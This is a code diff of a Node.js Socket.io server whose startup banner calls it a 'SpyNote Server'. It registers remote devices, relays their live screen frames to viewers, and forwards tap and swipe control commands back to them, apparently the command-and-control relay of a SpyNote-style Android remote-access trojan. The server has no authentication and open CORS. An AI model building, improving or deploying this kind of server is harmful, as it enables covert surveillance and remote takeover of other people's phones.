@@ -10,113 +10,87 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 30000,
     pingInterval: 10000,
-    maxHttpBufferSize: 100 * 1024 * 1024 // 100MB frames
+    maxHttpBufferSize: 50e6 // 50MB for frames
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '100mb' }));
-app.use(express.urlencoded({ limit: '100mb', extended: true }));
+app.use(express.json({ limit: '50mb' }));
 
 const devices = new Map();
-const deviceSockets = new Map(); // socketId -> deviceId mapping
 
-// ✅ Device registration API
 app.post('/register', (req, res) => {
-    const { deviceId, model, brand, version } = req.body;
+    const { deviceId, model, brand, version, status } = req.body;
     if (deviceId) {
-        devices.set(deviceId, { 
-            model, brand, version, 
-            connected: true, 
-            lastSeen: Date.now(),
-            socketId: null 
-        });
-        broadcastDevices();
-        console.log("✅ Device registered:", deviceId);
+        devices.set(deviceId, { model, brand, version, status, connected: true });
+        io.emit('devices-update', Array.from(devices.entries()));
     }
     res.json({ success: true });
 });
 
 app.get('/devices', (req, res) => {
-    res.json(Array.from(devices.entries()).filter(([_, info]) => 
-        Date.now() - info.lastSeen < 30000 // 30s timeout
-    ));
+    res.json(Array.from(devices.entries()));
 });
 
-// 🔥 PERFECT SOCKET.IO HANDLING
 io.on('connection', (socket) => {
     console.log('🔌 Client connected:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
-        if (deviceId && devices.has(deviceId)) {
+        if (deviceId) {
             devices.set(deviceId, { 
-                ...devices.get(deviceId), 
-                connected: true, 
-                socketId: socket.id,
-                lastSeen: Date.now()
+                ...deviceInfo, connected: true, socketId: socket.id 
             });
-            deviceSockets.set(socket.id, deviceId);
             socket.join(deviceId);
-            console.log("📱 Device online:", deviceId, socket.id);
-            broadcastDevices();
+            io.emit('devices-update', Array.from(devices.entries()));
+            console.log('📱 Device registered:', deviceId);
         }
     });
 
-    socket.on('select-device', ({ deviceId }) => {
-        console.log('🎯 Web selected:', deviceId);
-    });
-
-    // 🔥 ULTRA FAST SCREEN RELAY
+    // ULTRA-FAST Frame relay
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            devices.get(deviceId).lastSeen = Date.now();
-            socket.to(deviceId).emit('screen-update', data);
+            socket.to(deviceId).emit('screen-update', {
+                deviceId,
+                data: data.data,
+                width: data.width,
+                height: data.height,
+                timestamp: data.timestamp
+            });
         }
     });
 
-    // 🔥 INSTANT CONTROL RELAY
+    // PERFECT Control relay
     socket.on('control', (data) => {
-        const { deviceId, action, ...params } = data;
+        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('control', { action, ...params });
-            console.log('🎮 Control:', action, '→', deviceId);
+            socket.to(deviceId).emit('control', {
+                action,
+                x: parseInt(x) || 0,
+                y: parseInt(y) || 0,
+                startX: parseInt(startX) || 0,
+                startY: parseInt(startY) || 0,
+                endX: parseInt(endX) || 0,
+                endY: parseInt(endY) || 0
+            });
         }
-    });
-
-    socket.on('ping', () => {
-        socket.emit('pong');
     });
 
     socket.on('disconnect', () => {
-        const deviceId = deviceSockets.get(socket.id);
-        if (deviceId) {
-            devices.set(deviceId, { 
-                ...devices.get(deviceId), 
-                connected: false, 
-                socketId: null,
-                lastSeen: Date.now()
-            });
-            deviceSockets.delete(socket.id);
-            console.log('📱 Device offline:', deviceId);
-            broadcastDevices();
+        for (const [deviceId, info] of devices.entries()) {
+            if (info.socketId === socket.id) {
+                devices.set(deviceId, { ...info, connected: false });
+                io.emit('devices-update', Array.from(devices.entries()));
+                console.log('📱 Device disconnected:', deviceId);
+                break;
+            }
         }
     });
 });
 
-// Broadcast device list every 2s
-function broadcastDevices() {
-    const activeDevices = Array.from(devices.entries()).filter(([_, info]) => 
-        Date.now() - info.lastSeen < 30000
-    );
-    io.emit('devices-update', activeDevices);
-}
-
-setInterval(broadcastDevices, 2000);
-
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
-    console.log(`📱 Devices ready!`);
+    console.log(`📱 Multi-device ready!`);
 });
